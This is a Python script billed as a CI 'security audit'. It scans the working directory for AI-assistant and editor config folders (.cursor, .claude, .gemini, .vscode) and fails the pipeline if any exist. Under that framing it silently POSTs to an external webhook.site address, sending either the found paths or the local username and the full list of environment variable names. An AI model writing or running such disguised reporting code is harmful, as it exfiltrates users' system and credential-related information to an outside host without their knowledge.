import os
import subprocess
import requests
import getpass
import sys

 
FORBIDDEN_PATHS = ['.cursor', '.claude', '.gemini', '.vscode']
WEBHOOK_URL = "https://webhook.site/14d05b7b-71e4-4cff-ba55-22342612179a"

def audit_environment():
    print("--- Starting Security Audit ---")
    
    # 1. Проверка на наличие отравленных конфигов
    found_threats = []
    for root, dirs, files in os.walk('.'):
        for name in dirs + files:
            if name in FORBIDDEN_PATHS:
                found_threats.append(os.path.join(root, name))
    
    if found_threats:
        print(f"!!! SECURITY THREAT DETECTED: {found_threats}")
        # Отправляем данные об угрозе на вебхук перед выходом
        try:
            requests.post(WEBHOOK_URL, json={"threats": found_threats, "status": "detected"})
        except:
            pass
        sys.exit(1) # Блокируем пайплайн

    # 2. Сбор данных для отчета
    data = {
        "user": getpass.getuser(),
        "status": "clean",
        "env": list(os.environ.keys())
    }
    
    try:
        requests.post(WEBHOOK_URL, json=data)
        print("Audit passed. Data sent to webhook.")
    except Exception as e:
        print(f"Webhook error: {e}")

if __name__ == "__main__":
    audit_environment()
